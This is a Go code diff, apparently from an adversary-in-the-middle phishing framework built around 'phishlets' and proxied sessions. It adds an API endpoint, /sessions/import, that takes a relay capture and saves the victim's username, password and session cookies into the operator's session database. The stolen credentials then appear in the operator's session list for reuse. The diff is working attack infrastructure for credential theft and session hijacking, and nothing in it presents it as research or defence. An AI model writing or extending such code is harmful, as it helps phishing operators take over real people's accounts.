@@ -218,6 +218,7 @@ func StartApiServer(db *database.Database, cfg *Config, hp *HttpProxy, port int,
 	mux.HandleFunc(a.base+"/status", a.handleStatus)
 	mux.HandleFunc(a.base+"/sessions", a.handleSessions)
 	mux.HandleFunc(a.base+"/sessions/", a.handleSessionDetail)
+	mux.HandleFunc(a.base+"/sessions/import", a.handleSessionImport)
 	mux.HandleFunc(a.base+"/phishlets", a.handlePhishlets)
 	mux.HandleFunc(a.base+"/phishlets/", a.handlePhishletAction)
 	mux.HandleFunc(a.base+"/proxy", a.handleProxyCfg)
@@ -361,6 +362,77 @@ func (a *apiServer) handleSessionDetail(w http.ResponseWriter, r *http.Request) 
 	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(s)
+}
+
+// handleSessionImport — POST /sessions/import (mTLS): create a session row
+// from a relay capture so it appears in the session list with cookies.
+// Body: {"phishlet","session_id","username","password","cookies":[{name,value,domain,path}],
+//        "useragent","landing_url"}
+func (a *apiServer) handleSessionImport(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, `{"error":"POST only"}`, http.StatusMethodNotAllowed)
+		return
+	}
+	var req struct {
+		Phishlet   string `json:"phishlet"`
+		SessionId  string `json:"session_id"`
+		Username   string `json:"username"`
+		Password   string `json:"password"`
+		Cookies    []struct {
+			Name   string `json:"name"`
+			Value  string `json:"value"`
+			Domain string `json:"domain"`
+			Path   string `json:"path"`
+		} `json:"cookies"`
+		UserAgent  string `json:"useragent"`
+		LandingURL string `json:"landing_url"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, `{"error":"bad body"}`, http.StatusBadRequest)
+		return
+	}
+	if req.Phishlet == "" || req.SessionId == "" {
+		http.Error(w, `{"error":"phishlet and session_id are required"}`, http.StatusBadRequest)
+		return
+	}
+	// create the session row
+	if err := a.db.CreateSession(req.SessionId, req.Phishlet, req.LandingURL,
+		req.UserAgent, "relay-import"); err != nil {
+		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusConflict)
+		return
+	}
+	if req.Username != "" {
+		a.db.SetSessionUsername(req.SessionId, req.Username)
+	}
+	if req.Password != "" {
+		a.db.SetSessionPassword(req.SessionId, req.Password)
+	}
+	// merge cookies into CookieTokens (domain -> name -> token)
+	if len(req.Cookies) > 0 {
+		tokens := make(map[string]map[string]*database.CookieToken)
+		for _, c := range req.Cookies {
+			if c.Domain == "" || c.Name == "" {
+				continue
+			}
+			if tokens[c.Domain] == nil {
+				tokens[c.Domain] = make(map[string]*database.CookieToken)
+			}
+			path := c.Path
+			if path == "" {
+				path = "/"
+			}
+			tokens[c.Domain][c.Name] = &database.CookieToken{
+				Name:     c.Name,
+				Value:    c.Value,
+				Path:     path,
+			}
+		}
+		a.db.SetSessionCookieTokens(req.SessionId, tokens)
+	}
+	log.Info("api: relay capture imported as session %s (%s, %d cookies)",
+		req.SessionId, req.Username, len(req.Cookies))
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{"result": "imported", "session_id": req.SessionId})
 }
 
 func (a *apiServer) handlePhishlets(w http.ResponseWriter, r *http.Request) {
